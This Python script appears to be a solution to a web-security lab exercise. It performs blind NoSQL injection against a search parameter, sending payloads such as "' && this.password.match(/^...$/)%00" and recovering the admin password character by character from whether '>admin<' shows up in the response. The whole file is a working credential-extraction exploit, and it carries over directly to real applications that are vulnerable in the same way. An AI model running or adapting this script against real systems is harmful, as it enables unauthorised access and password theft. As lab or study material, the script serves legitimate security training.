import urllib.request
import re

#variables

url = "http://ptc-a374cd52-04669da8.libcurl.so/?search=admin"
injection = "'%20%26%26%20this.password.match(/^"
ending = "$/)%00"
wildcard = ".*"

# Creating hex array
#EDIT: Didn't end up actually being a hex value array, as I figured I could just use the characters themselves.
hexarray = ["0","1","2","3","4","5","6","7","8","9","a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","x","w","y","z"]


def checkLetter():
    global password
    global wildcard

    #for each item on list, check if it's accepted as a password with wildcard
    for x in hexarray:
        requestwild = urllib.request.urlopen(url+injection+password+x+wildcard+ending) #This is a request with the wildcard
        request = urllib.request.urlopen(url+injection+password+x+ending) #This is a request without the wildcard, to check if the pass is complete.
        responsewild = re.findall(">admin<",str(requestwild.read(4096)))
        response = re.findall(">admin<",str(request.read(4096)))
        print("character: "+x+" | payload: "+injection+password+x+wildcard+ending)
        if (len(responsewild) > 0): #Se deu certo com wildcard
            password += x
            passwordlist.append(x)
            print(password)
            if(len(response) > 0): #se deu certo sem wildcard
                return
            break
        else:
            continue
        
i = 1
password = ""
while i <= 40: #This is how many characters there are in the password.
#EDIT: I may have miscounted it, as in iteration 37 I already had the complete key.
    print("Iteration: "+str(i)) #This I used for debugging
    if (i == 9 or i == 14 or i == 19 or i == 24):
        password += "-"
        print(password) #Debugging
    else:
        checkLetter()
    i += 1

print(password)

